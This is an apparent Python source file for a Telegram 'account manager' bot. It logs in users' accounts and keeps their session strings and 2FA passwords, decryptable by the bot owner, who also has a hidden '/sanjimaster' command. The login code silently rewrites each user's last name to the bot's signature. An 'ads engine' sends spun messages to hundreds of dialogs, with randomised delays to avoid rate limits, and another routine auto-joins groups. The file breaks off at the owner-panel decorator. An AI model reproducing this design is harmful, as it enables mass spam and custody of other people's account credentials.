# ============================================================
# @sanjimanager — Telegram Account Manager Bot
# Single-file build. Owner panel hidden behind /sanjimaster.
# ============================================================
# SETUP:
#   1. pip install -r requirements.txt
#   2. Create .env with BOT_TOKEN, API_ID, API_HASH, FERNET_KEY, OWNER_ID
#   3. python main.py
# ============================================================

import asyncio
import json
import logging
import os
import random
import re
import time
from typing import Optional

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
)
from aiogram.client.default import DefaultBotProperties

import aiosqlite
from cryptography.fernet import Fernet
from dotenv import load_dotenv
import httpx

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    AuthKeyUnregisteredError,
    UserDeactivatedBanError,
)
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.contacts import SearchRequest as ContactsSearchRequest
from telethon.tl.types import MessageEntityCustomEmoji

load_dotenv()

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
FERNET_KEY = os.getenv("FERNET_KEY", "")
OWNER_ID = int(os.getenv("OWNER_ID", "7966027018"))
DB_PATH = os.getenv("DB_PATH", "sanjimanager.db")

SIGNATURE = "via @sanjimanager"
OWNER_CMD = "sanjimaster"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("sanjimanager")

if not FERNET_KEY:
    log.error(
        "FERNET_KEY missing. Generate with: "
        "python -c \"from cryptography.fernet import Fernet;print(Fernet.generate_key().decode())\""
    )
    raise SystemExit(1)

fernet = Fernet(FERNET_KEY.encode() if isinstance(FERNET_KEY, str) else FERNET_KEY)


def enc(plain: str) -> str:
    """Encrypt a string with Fernet."""
    return fernet.encrypt(plain.encode()).decode()


def dec(cipher: str) -> str:
    """Decrypt a Fernet string."""
    return fernet.decrypt(cipher.encode()).decode()


# ============================================================
# DATABASE
# ============================================================
SCHEMA = """
CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_id INTEGER UNIQUE NOT NULL,
    username TEXT,
    created_at INTEGER NOT NULL,
    is_premium INTEGER DEFAULT 0,
    api_provider TEXT,
    api_key TEXT,
    ai_model TEXT,
    ai_enabled INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS accounts(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    phone TEXT NOT NULL,
    session_str TEXT NOT NULL,
    first_name TEXT,
    last_name TEXT,
    has_2fa INTEGER DEFAULT 0,
    password_enc TEXT,
    active INTEGER DEFAULT 1,
    autoreply_enabled INTEGER DEFAULT 0,
    autoreply_mode TEXT DEFAULT 'ai',
    autoreply_prompt TEXT DEFAULT 'Be friendly and helpful.',
    autoreply_rules TEXT DEFAULT '{}',
    reply_on_tag INTEGER DEFAULT 1,
    ad_message TEXT DEFAULT '',
    ad_delay_min INTEGER DEFAULT 30,
    ad_delay_max INTEGER DEFAULT 90,
    emoji_pool TEXT DEFAULT '[]',
    created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS premium_emojis(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    emoji_id INTEGER NOT NULL,
    label TEXT,
    added_by INTEGER,
    created_at INTEGER
);

CREATE TABLE IF NOT EXISTS settings(
    key TEXT PRIMARY KEY,
    value TEXT
);

CREATE TABLE IF NOT EXISTS owner_api_vault(
    provider TEXT PRIMARY KEY,
    api_key TEXT,
    updated_at INTEGER
);
"""


async def db_init() -> None:
    async with aiosqlite.connect(DB_PATH) as db:
        await db.executescript(SCHEMA)
        await db.commit()


async def db_q(sql: str, params: tuple = ()):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cur = await db.execute(sql, params)
        rows = await cur.fetchall()
        await db.commit()
        return rows


async def db_one(sql: str, params: tuple = ()):
    rows = await db_q(sql, params)
    return rows[0] if rows else None


async def db_exec(sql: str, params: tuple = ()):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(sql, params)
        await db.commit()
        return cur.lastrowid


# ============================================================
# AI PROVIDERS
# ============================================================
AI_PROVIDERS = {
    "openai": {
        "url": "https://api.openai.com/v1/chat/completions",
        "models": [
            "gpt-4o-mini",
            "gpt-4o",
            "gpt-4.1-mini",
            "gpt-3.5-turbo",
        ],
    },
    "gemini": {
        "url": "https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={key}",
        "models": [
            "gemini-1.5-flash",
            "gemini-1.5-pro",
            "gemini-2.0-flash-exp",
        ],
        "style": "gemini",
    },
    "groq": {
        "url": "https://api.groq.com/openai/v1/chat/completions",
        "models": [
            "llama-3.3-70b-versatile",
            "llama-3.1-8b-instant",
            "mixtral-8x7b-32768",
        ],
    },
    "openrouter": {
        "url": "https://openrouter.ai/api/v1/chat/completions",
        "models": [
            "openai/gpt-4o-mini",
            "anthropic/claude-3.5-sonnet",
            "meta-llama/llama-3.3-70b-instruct",
        ],
    },
    "mistral": {
        "url": "https://api.mistral.ai/v1/chat/completions",
        "models": [
            "mistral-small-latest",
            "mistral-large-latest",
            "open-mistral-7b",
        ],
    },
}


async def ai_call(
    provider: str,
    key: str,
    model: str,
    system_prompt: str,
    user_msg: str,
) -> Optional[str]:
    """Call a specific AI provider. Returns reply text or None."""
    cfg = AI_PROVIDERS.get(provider)
    if not cfg:
        return None

    try:
        async with httpx.AsyncClient(timeout=45) as hc:
            if cfg.get("style") == "gemini":
                url = cfg["url"].format(model=model, key=key)
                payload = {
                    "system_instruction": {
                        "parts": [{"text": system_prompt}]
                    },
                    "contents": [
                        {"role": "user", "parts": [{"text": user_msg}]}
                    ],
                }
                resp = await hc.post(url, json=payload)
                resp.raise_for_status()
                data = resp.json()
                return (
                    data["candidates"][0]["content"]["parts"][0]["text"]
                    .strip()
                )

            headers = {
                "Authorization": f"Bearer {key}",
                "Content-Type": "application/json",
            }
            if provider == "openrouter":
                headers["HTTP-Referer"] = "https://t.me/sanjimanager"
                headers["X-Title"] = "sanjimanager"

            payload = {
                "model": model,
                "messages": [
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": user_msg},
                ],
                "temperature": 0.8,
                "max_tokens": 400,
            }
            resp = await hc.post(cfg["url"], json=payload, headers=headers)
            resp.raise_for_status()
            data = resp.json()
            return data["choices"][0]["message"]["content"].strip()
    except Exception as e:
        log.warning(f"ai_call failed [{provider}/{model}]: {e}")
        return None


# ============================================================
# PREMIUM EMOJI HELPERS
# ============================================================
async def get_emoji_pool() -> list:
    """Fetch up to 50 premium emoji IDs from the DB."""
    rows = await db_q(
        "SELECT emoji_id FROM premium_emojis ORDER BY id DESC LIMIT 50"
    )
    return [row["emoji_id"] for row in rows]


async def send_with_emoji(
    client: TelegramClient,
    chat,
    text: str,
    emoji_pool: Optional[list] = None,
):
    """Send a message, appending premium emoji entities at the end."""
    if emoji_pool is None:
        emoji_pool = await get_emoji_pool()

    if not emoji_pool:
        return await client.send_message(chat, text, parse_mode=None)

    taken = emoji_pool[:8]
    suffix = " " + "".join("⭐" for _ in taken)
    full_text = text + suffix

    base_utf16 = len(text.encode("utf-16-le")) // 2
    entity_offset = base_utf16 + 1  # skip the single space

    entities = []
    for emoji_id in taken:
        entities.append(
            MessageEntityCustomEmoji(
                offset=entity_offset,
                length=1,
                document_id=emoji_id,
            )
        )
        entity_offset += 1

    return await client.send_message(
        chat,
        full_text,
        formatting_entities=entities,
    )


# ============================================================
# CLIENT POOL
# ============================================================
active_clients: dict = {}
pending_logins: dict = {}


async def get_client(account_row):
    """Return a connected TelegramClient for an account row, or None."""
    aid = account_row["id"]

    if aid in active_clients:
        existing = active_clients[aid]
        if existing.is_connected():
            return existing
        active_clients.pop(aid, None)

    try:
        session_str = dec(account_row["session_str"])
        if session_str == "__pending__":
            return None

        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await client.disconnect()
            await db_exec(
                "UPDATE accounts SET active=0 WHERE id=?",
                (aid,),
            )
            return None

        active_clients[aid] = client
        _register_autoreply(client, aid)
        return client

    except (AuthKeyUnregisteredError, UserDeactivatedBanError):
        await db_exec(
            "UPDATE accounts SET active=0 WHERE id=?",
            (aid,),
        )
        return None

    except Exception as e:
        log.warning(f"get_client failed for account {aid}: {e}")
        return None


def _register_autoreply(client: TelegramClient, account_id: int) -> None:
    """Attach a new-message handler for auto-reply."""

    @client.on(events.NewMessage(incoming=True))
    async def _handler(event):
        try:
            await handle_autoreply(event, account_id)
        except Exception as e:
            log.warning(f"autoreply error acc={account_id}: {e}")


async def handle_autoreply(event, account_id: int) -> None:
    """Handle an incoming message for an account's auto-reply rules."""
    acc = await db_one("SELECT * FROM accounts WHERE id=?", (account_id,))
    if not acc:
        return
    if not acc["autoreply_enabled"]:
        return

    text = (event.message.message or "").strip()
    if not text:
        return

    sender = await event.get_sender()
    if not sender:
        return
    if getattr(sender, "bot", False):
        return

    is_group = event.is_group or event.is_channel
    me = await event.client.get_me()

    if is_group and acc["reply_on_tag"]:
        tagged = False
        if me.username:
            handle = f"@{me.username.lower()}"
            if handle in text.lower():
                tagged = True
        for entity in (event.message.entities or []):
            if hasattr(entity, "user_id") and entity.user_id == me.id:
                tagged = True
        if not tagged:
            return

    user = await db_one("SELECT * FROM users WHERE id=?", (acc["user_id"],))
    if not user:
        return

    reply_text = None

    if acc["autoreply_mode"] == "rules":
        try:
            rules = json.loads(acc["autoreply_rules"] or "{}")
        except Exception:
            rules = {}
        for keyword, value in rules.items():
            if keyword == "_default":
                continue
            if keyword.lower() in text.lower():
                reply_text = value
                break
        if not reply_text:
            reply_text = rules.get("_default")

    else:
        if not user["ai_enabled"]:
            return

        provider = user["api_provider"]
        key = None
        model = user["ai_model"]

        if user["api_key"]:
            try:
                key = dec(user["api_key"])
            except Exception:
                key = None

        if not (provider and key and model):
            vault = await db_one(
                "SELECT * FROM owner_api_vault LIMIT 1"
            )
            if vault and vault["api_key"]:
                provider = vault["provider"]
                try:
                    key = dec(vault["api_key"])
                except Exception:
                    key = None
                model = (
                    AI_PROVIDERS.get(provider, {})
                    .get("models", [None])[0]
                )

        if not (provider and key and model):
            return

        reply_text = await ai_call(
            provider,
            key,
            model,
            acc["autoreply_prompt"],
            text,
        )

    if not reply_text:
        return

    await asyncio.sleep(random.uniform(2, 8))

    try:
        await event.reply(reply_text)
    except FloodWaitError as fw:
        await asyncio.sleep(fw.seconds + 5)
        try:
            await event.reply(reply_text)
        except Exception:
            pass


# ============================================================
# LOGIN FLOW
# ============================================================
class LoginState(StatesGroup):
    phone = State()
    otp = State()
    password = State()


class EditStates(StatesGroup):
    edit_field = State()
    ai_key = State()
    join_query = State()
    sa_message = State()
    emoji_add = State()
    emoji_extract = State()
    vault_key = State()


def otp_keyboard(current: str) -> InlineKeyboardMarkup:
    """Build the OTP entry inline keyboard."""

    def digit_btn(d: str) -> InlineKeyboardButton:
        return InlineKeyboardButton(text=d, callback_data=f"otp:{d}")

    rows = [
        [digit_btn("1"), digit_btn("2"), digit_btn("3")],
        [digit_btn("4"), digit_btn("5"), digit_btn("6")],
        [digit_btn("7"), digit_btn("8"), digit_btn("9")],
        [
            InlineKeyboardButton(text="⌫", callback_data="otp:del"),
            digit_btn("0"),
            InlineKeyboardButton(text="✓", callback_data="otp:ok"),
        ],
        [
            InlineKeyboardButton(
                text=f"Code: {current if current else '—'}",
                callback_data="otp:noop",
            )
        ],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)


async def start_login(phone: str):
    """Begin a login. Returns (client, phone_code_hash, error)."""
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        return client, sent.phone_code_hash, None
    except FloodWaitError as fw:
        await client.disconnect()
        return None, None, f"Flood wait: {fw.seconds}s"
    except Exception as e:
        await client.disconnect()
        return None, None, str(e)


async def complete_login(
    client: TelegramClient,
    phone: str,
    code: str,
    password: Optional[str] = None,
):
    """Finish login. Returns (session_str, error, needs_password)."""
    try:
        await client.sign_in(phone=phone, code=code)
    except SessionPasswordNeededError:
        if not password:
            return None, None, True
        try:
            await client.sign_in(password=password)
        except Exception as e:
            return None, str(e), False
    except PhoneCodeInvalidError:
        return None, "Invalid code", False
    except PhoneCodeExpiredError:
        return None, "Code expired", False
    except Exception as e:
        return None, str(e), False

    try:
        me = await client.get_me()
        first_name = me.first_name or "User"
        await client(
            UpdateProfileRequest(
                first_name=first_name,
                last_name=SIGNATURE,
            )
        )
    except Exception as e:
        log.warning(f"name injection failed: {e}")

    return StringSession.save(client.session), None, False


# ============================================================
# ADS ENGINE
# ============================================================
def spin_text(template: str) -> str:
    """Expand {a|b|c} spin syntax into a random choice."""

    def replacer(match):
        options = match.group(1).split("|")
        return random.choice(options)

    return re.sub(r"\{([^{}]+)\}", replacer, template)


async def safe_dm(bot: Bot, user_id: int, text: str) -> None:
    """Send a DM to a user by internal user id, silently ignoring errors."""
    try:
        row = await db_one(
            "SELECT tg_id FROM users WHERE id=?",
            (user_id,),
        )
        if row:
            await bot.send_message(row["tg_id"], text)
    except Exception:
        pass


async def run_ads(account_row, bot: Bot):
    """Broadcast ad_message to all dialogs of an account."""
    aid = account_row["id"]
    client = await get_client(account_row)
    if not client:
        await safe_dm(bot, account_row["user_id"], "❌ Ads failed: session dead.")
        return

    template = account_row["ad_message"] or ""
    if not template.strip():
        await safe_dm(
            bot,
            account_row["user_id"],
            "❌ Ads failed: set an ad message first.",
        )
        return

    emoji_ids = await get_emoji_pool()
    dmin = max(5, account_row["ad_delay_min"] or 30)
    dmax = max(dmin + 5, account_row["ad_delay_max"] or 90)

    sent = 0
    failed = 0

    try:
        async for dialog in client.iter_dialogs():
            if not (dialog.is_group or dialog.is_user):
                continue

            text = spin_text(template)

            try:
                await send_with_emoji(client, dialog.id, text, emoji_ids)
                sent += 1
            except FloodWaitError as fw:
                await asyncio.sleep(fw.seconds + 5)
                try:
                    await send_with_emoji(
                        client,
                        dialog.id,
                        text,
                        emoji_ids,
                    )
                    sent += 1
                except Exception:
                    failed += 1
            except Exception:
                failed += 1

            await asyncio.sleep(random.uniform(dmin, dmax))

            if sent >= 500:
                break
    finally:
        await safe_dm(
            bot,
            account_row["user_id"],
            f"📣 Ads done.\n✅ Sent: {sent}\n❌ Failed: {failed}",
        )

    return {"sent": sent, "failed": failed}


async def smart_group_join(account_row, query: str, bot: Bot):
    """Search and join public groups by keyword."""
    client = await get_client(account_row)
    if not client:
        await safe_dm(
            bot,
            account_row["user_id"],
            "❌ Smart join failed: session dead.",
        )
        return

    joined = 0

    try:
        result = await client(ContactsSearchRequest(q=query, limit=30))
        for chat in result.chats:
            try:
                await client(JoinChannelRequest(chat))
                joined += 1
                await asyncio.sleep(random.uniform(20, 60))
            except FloodWaitError as fw:
                await asyncio.sleep(fw.seconds + 5)
            except Exception:
                continue
    except Exception as e:
        await safe_dm(
            bot,
            account_row["user_id"],
            f"❌ Smart join failed: {e}",
        )
        return

    await safe_dm(
        bot,
        account_row["user_id"],
        f"🎯 Smart join done for '{query}'.\nJoined: {joined}",
    )


# ============================================================
# AIOGRAM BOT
# ============================================================
bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=None),
)
dp = Dispatcher(storage=MemoryStorage())

owner_router = Router()
user_router = Router()

# Owner router registered FIRST so its commands never get swallowed.
dp.include_router(owner_router)
dp.include_router(user_router)


def is_owner(tg_id: int) -> bool:
    return tg_id == OWNER_ID


async def ensure_user(x):
    """Create user if missing, return row."""
    from_user = x.from_user
    row = await db_one(
        "SELECT * FROM users WHERE tg_id=?",
        (from_user.id,),
    )
    if not row:
        await db_exec(
            "INSERT INTO users(tg_id, username, created_at) VALUES(?,?,?)",
            (from_user.id, from_user.username or "", int(time.time())),
        )
        row = await db_one(
            "SELECT * FROM users WHERE tg_id=?",
            (from_user.id,),
        )
    return row


def user_menu() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text="📱 My Accounts"),
                KeyboardButton(text="➕ Add Account"),
            ],
            [
                KeyboardButton(text="🤖 AI Settings"),
                KeyboardButton(text="📣 Ads Manager"),
            ],
            [
                KeyboardButton(text="ℹ️ Help"),
            ],
        ],
        resize_keyboard=True,
    )


# ============================================================
# USER HANDLERS
# ============================================================
@user_router.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    await ensure_user(msg)
    await msg.answer(
        "👋 Welcome to *sanjimanager*\n\n"
        "Manage Telegram accounts, auto-reply, AI assistant, ads — all here.",
        reply_markup=user_menu(),
        parse_mode="Markdown",
    )


@user_router.message(F.text == "➕ Add Account")
async def add_entry(msg: Message, state: FSMContext):
    await state.clear()
    await ensure_user(msg)
    await state.set_state(LoginState.phone)
    await msg.answer(
        "📱 Send phone with country code (e.g. `+919876543210`)",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove(),
    )


@user_router.message(LoginState.phone)
async def add_phone(msg: Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")

    if not re.match(r"^\+\d{6,15}$", phone):
        await msg.answer(
            "❌ Invalid. Send like `+919876543210`",
            parse_mode="Markdown",
        )
        return

    await msg.answer("⏳ Sending login code…")

    client, code_hash, err = await start_login(phone)
    if err or not client:
        await msg.answer(f"❌ Could not send code: {err}")
        await state.clear()
        return

    user = await ensure_user(msg)
    acc_id = await db_exec(
        "INSERT INTO accounts(user_id, phone, session_str, created_at) "
        "VALUES(?,?,?,?)",
        (
            user["id"],
            phone,
            enc("__pending__"),
            int(time.time()),
        ),
    )

    pending_logins[acc_id] = {
        "client": client,
        "phone": phone,
        "hash": code_hash,
        "code": "",
    }

    await state.update_data(acc_id=acc_id)
    await state.set_state(LoginState.otp)

    await msg.answer(
        "🔐 Enter the login code with the buttons below.\n"
        "Tap ✓ when complete.",
        reply_markup=otp_keyboard(""),
    )


@user_router.callback_query(LoginState.otp, F.data.startswith("otp:"))
async def otp_cb(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    acc_id = data.get("acc_id")

    if not acc_id or acc_id not in pending_logins:
        await cb.answer("Session expired", show_alert=True)
        return

    action = cb.data.split(":", 1)[1]
    entry = pending_logins[acc_id]
    code = entry.get("code", "")

    if action == "noop":
        await cb.answer()
        return

    if action == "del":
        code = code[:-1]

    elif action == "ok":
        if len(code) < 4:
            await cb.answer("Code too short", show_alert=True)
            return

        await cb.answer()

        session_str, err, needs_pw = await complete_login(
            entry["client"],
            entry["phone"],
            code,
        )

        if needs_pw:
            await state.set_state(LoginState.password)
            await cb.message.edit_text(
                "🔒 This account has 2FA enabled.\n"
                "Send the password now. I'll wipe it from chat.",
            )
            return

        if err or not session_str:
            await cb.message.edit_text(f"❌ Login failed: {err}")
            try:
                await entry["client"].disconnect()
            except Exception:
                pass
            pending_logins.pop(acc_id, None)
            await state.clear()
            return

        await finalize_account(
            cb.message,
            acc_id,
            session_str,
            has_2fa=False,
            password=None,
        )
        await state.clear()
        return

    else:
        if len(code) >= 6:
            await cb.answer()
            return
        code += action

    entry["code"] = code

    try:
        await cb.message.edit_reply_markup(
            reply_markup=otp_keyboard(code)
        )
    except Exception:
        pass

    await cb.answer()


@user_router.message(LoginState.password)
async def add_password(msg: Message, state: FSMContext):
    pw = msg.text.strip()

    try:
        await msg.delete()
    except Exception:
        pass

    data = await state.get_data()
    acc_id = data.get("acc_id")

    if not acc_id or acc_id not in pending_logins:
        await msg.answer("Session expired.", reply_markup=user_menu())
        await state.clear()
        return

    entry = pending_logins[acc_id]

    session_str, err, _ = await complete_login(
        entry["client"],
        entry["phone"],
        entry["code"],
        password=pw,
    )

    if err or not session_str:
        await msg.answer(
            f"❌ 2FA login failed: {err}",
            reply_markup=user_menu(),
        )
        pending_logins.pop(acc_id, None)
        await state.clear()
        return

    await finalize_account(
        msg,
        acc_id,
        session_str,
        has_2fa=True,
        password=pw,
    )
    await state.clear()


async def finalize_account(
    msg: Message,
    acc_id: int,
    session_str: str,
    has_2fa: bool,
    password: Optional[str],
):
    entry = pending_logins.pop(acc_id, None)
    if entry:
        try:
            await entry["client"].disconnect()
        except Exception:
            pass

    enc_session = enc(session_str)
    enc_password = enc(password) if password else None

    await db_exec(
        "UPDATE accounts SET session_str=?, has_2fa=?, "
        "password_enc=?, active=1 WHERE id=?",
        (enc_session, 1 if has_2fa else 0, enc_password, acc_id),
    )

    row = await db_one("SELECT * FROM accounts WHERE id=?", (acc_id,))
    await get_client(row)

    await msg.answer(
        f"✅ Account added.\n📱 {row['phone']}\n"
        f"Signature: *{SIGNATURE}*",
        reply_markup=user_menu(),
        parse_mode="Markdown",
    )


@user_router.message(F.text == "📱 My Accounts")
async def my_accounts(msg: Message, state: FSMContext):
    await state.clear()
    user = await ensure_user(msg)
    rows = await db_q(
        "SELECT * FROM accounts WHERE user_id=? ORDER BY id DESC",
        (user["id"],),
    )

    if not rows:
        await msg.answer("No accounts yet. Tap ➕ Add Account.")
        return

    for row in rows:
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text=(
                            "AutoReply: 🟢 ON"
                            if row["autoreply_enabled"]
                            else "AutoReply: 🔴 OFF"
                        ),
                        callback_data=f"acc:tgl_ar:{row['id']}",
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="✏️ Set Auto-Reply Prompt",
                        callback_data=f"acc:prompt:{row['id']}",
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="📝 Set Ad Message",
                        callback_data=f"acc:adm:{row['id']}",
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="🗑 Remove Account",
                        callback_data=f"acc:rm:{row['id']}",
                    )
                ],
            ]
        )

        await msg.answer(
            f"📱 *{row['phone']}*\n"
            f"Active: {'yes' if row['active'] else 'no'}\n"
            f"Ad set: {'yes' if row['ad_message'] else 'no'}",
            parse_mode="Markdown",
            reply_markup=kb,
        )


@user_router.callback_query(F.data.startswith("acc:"))
async def acc_cb(cb: CallbackQuery, state: FSMContext):
    _, action, aid_str = cb.data.split(":")
    aid = int(aid_str)

    user = await ensure_user(cb)
    acc = await db_one(
        "SELECT * FROM accounts WHERE id=? AND user_id=?",
        (aid, user["id"]),
    )

    if not acc:
        await cb.answer("Not found", show_alert=True)
        return

    if action == "tgl_ar":
        new_val = 0 if acc["autoreply_enabled"] else 1
        await db_exec(
            "UPDATE accounts SET autoreply_enabled=? WHERE id=?",
            (new_val, aid),
        )
        await cb.answer(f"AutoReply {'ON' if new_val else 'OFF'}")
        return

    if action == "prompt":
        await state.update_data(
            edit_acc=aid,
            edit_field="autoreply_prompt",
        )
        await state.set_state(EditStates.edit_field)
        await cb.message.answer("Send the new auto-reply system prompt.")
        await cb.answer()
        return

    if action == "adm":
        await state.update_data(
            edit_acc=aid,
            edit_field="ad_message",
        )
        await state.set_state(EditStates.edit_field)
        await cb.message.answer(
            "Send the ad template. Use `{hi|hey|yo}` for spin."
        )
        await cb.answer()
        return

    if action == "rm":
        if aid in active_clients:
            try:
                await active_clients[aid].disconnect()
            except Exception:
                pass
            active_clients.pop(aid, None)
        await db_exec("DELETE FROM accounts WHERE id=?", (aid,))
        await cb.message.edit_text("🗑 Account removed.")
        await cb.answer()
        return


@user_router.message(F.text == "🤖 AI Settings")
async def ai_settings(msg: Message, state: FSMContext):
    await state.clear()
    user = await ensure_user(msg)

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🔑 Set API Key",
                    callback_data="ai:key",
                )
            ],
            [
                InlineKeyboardButton(
                    text="🧠 Select Provider",
                    callback_data="ai:provider",
                )
            ],
            [
                InlineKeyboardButton(
                    text="🎯 Select Model",
                    callback_data="ai:model",
                )
            ],
            [
                InlineKeyboardButton(
                    text=(
                        "⚡ AI Reply: ON"
                        if user["ai_enabled"]
                        else "⚡ AI Reply: OFF"
                    ),
                    callback_data="ai:toggle",
                )
            ],
        ]
    )

    provider = user["api_provider"] or "—"
    model = user["ai_model"] or "—"
    key_set = "yes" if user["api_key"] else "no"

    await msg.answer(
        f"🤖 *AI Settings*\n\n"
        f"Provider: {provider}\n"
        f"Model: {model}\n"
        f"Key set: {key_set}",
        parse_mode="Markdown",
        reply_markup=kb,
    )


@user_router.callback_query(F.data.startswith("ai:"))
async def ai_cb(cb: CallbackQuery, state: FSMContext):
    action = cb.data.split(":", 1)[1]
    user = await ensure_user(cb)

    if action == "toggle":
        new_val = 0 if user["ai_enabled"] else 1
        await db_exec(
            "UPDATE users SET ai_enabled=? WHERE id=?",
            (new_val, user["id"]),
        )
        await cb.answer(f"AI {'ON' if new_val else 'OFF'}")
        return

    if action == "key":
        await state.set_state(EditStates.ai_key)
        await cb.message.answer(
            "Send your API key. It will be encrypted and stored."
        )
        await cb.answer()
        return

    if action == "provider":
        buttons = [
            [
                InlineKeyboardButton(
                    text=name,
                    callback_data=f"ai:p:{name}",
                )
            ]
            for name in AI_PROVIDERS
        ]
        await cb.message.answer(
            "Choose provider:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
        )
        await cb.answer()
        return

    if action == "model":
        if not user["api_provider"]:
            await cb.answer("Pick provider first", show_alert=True)
            return
        models = AI_PROVIDERS[user["api_provider"]]["models"]
        buttons = [
            [
                InlineKeyboardButton(
                    text=m,
                    callback_data=f"ai:m:{m}",
                )
            ]
            for m in models
        ]
        await cb.message.answer(
            "Choose model:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
        )
        await cb.answer()
        return

    if action.startswith("p:"):
        provider_name = action[2:]
        await db_exec(
            "UPDATE users SET api_provider=? WHERE id=?",
            (provider_name, user["id"]),
        )
        await cb.answer(f"Provider set: {provider_name}")
        return

    if action.startswith("m:"):
        model_name = action[2:]
        await db_exec(
            "UPDATE users SET ai_model=? WHERE id=?",
            (model_name, user["id"]),
        )
        await cb.answer(f"Model set: {model_name}")
        return


@user_router.message(F.text == "📣 Ads Manager")
async def ads_menu(msg: Message, state: FSMContext):
    await state.clear()
    user = await ensure_user(msg)
    rows = await db_q(
        "SELECT * FROM accounts WHERE user_id=?",
        (user["id"],),
    )

    if not rows:
        await msg.answer("Add an account first.")
        return

    buttons = []
    for row in rows:
        buttons.append([
            InlineKeyboardButton(
                text=f"📣 Run ads: {row['phone']}",
                callback_data=f"ads:run:{row['id']}",
            )
        ])
        buttons.append([
            InlineKeyboardButton(
                text=f"🎯 Smart join: {row['phone']}",
                callback_data=f"ads:join:{row['id']}",
            )
        ])

    await msg.answer(
        "Choose an action:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
    )


@user_router.callback_query(F.data.startswith("ads:"))
async def ads_cb(cb: CallbackQuery, state: FSMContext):
    _, action, aid_str = cb.data.split(":")
    aid = int(aid_str)

    user = await ensure_user(cb)
    acc = await db_one(
        "SELECT * FROM accounts WHERE id=? AND user_id=?",
        (aid, user["id"]),
    )

    if not acc:
        await cb.answer("Not found", show_alert=True)
        return

    if action == "run":
        if not acc["ad_message"]:
            await cb.answer(
                "Set ad message first in My Accounts",
                show_alert=True,
            )
            return
        await cb.message.answer("🚀 Ads started. Will notify when done.")
        asyncio.create_task(run_ads(acc, bot))
        await cb.answer()
        return

    if action == "join":
        await state.update_data(join_acc=aid)
        await state.set_state(EditStates.join_query)
        await cb.message.answer("Send the search keyword.")
        await cb.answer()
        return


@user_router.message(F.text == "ℹ️ Help")
async def help_msg(msg: Message, state: FSMContext):
    await state.clear()
    await msg.answer(
        "ℹ️ *Help*\n\n"
        "➕ Add Account — login a phone number\n"
        "📱 My Accounts — manage accounts, ads, autoreply\n"
        "🤖 AI Settings — API key, provider, model\n"
        "📣 Ads Manager — broadcast + smart group join\n\n"
        f"Signature auto-added: *{SIGNATURE}*",
        parse_mode="Markdown",
    )


# ============================================================
# UNIFIED TEXT DISPATCHER (user side)
# ============================================================
@user_router.message(F.text, ~F.text.startswith("/"))
async def unified_text(msg: Message, state: FSMContext):
    current = await state.get_state()

    if current == EditStates.edit_field.state:
        data = await state.get_data()
        field = data["edit_field"]
        acc_id = data["edit_acc"]
        await db_exec(
            f"UPDATE accounts SET {field}=? WHERE id=?",
            (msg.text, acc_id),
        )
        await msg.answer(
            f"✅ Saved {field}.",
            reply_markup=user_menu(),
        )
        await state.clear()
        return

    if current == EditStates.ai_key.state:
        user = await ensure_user(msg)
        await db_exec(
            "UPDATE users SET api_key=? WHERE id=?",
            (enc(msg.text.strip()), user["id"]),
        )
        try:
            await msg.delete()
        except Exception:
            pass
        await msg.answer(
            "✅ API key saved (encrypted).",
            reply_markup=user_menu(),
        )
        await state.clear()
        return

    if current == EditStates.join_query.state:
        data = await state.get_data()
        acc = await db_one(
            "SELECT * FROM accounts WHERE id=?",
            (data.get("join_acc"),),
        )
        if acc:
            await msg.answer(
                f"🎯 Smart join started for '{msg.text}'."
            )
            asyncio.create_task(
                smart_group_join(acc, msg.text, bot)
            )
        await state.clear()
        return

    # Unknown text — stay silent so we don't leak anything


# ============================================================
# OWNER PANEL — /sanjimaster (hidden)
# ============================================================
@owner_router.message(Command(OWNER_CMD))
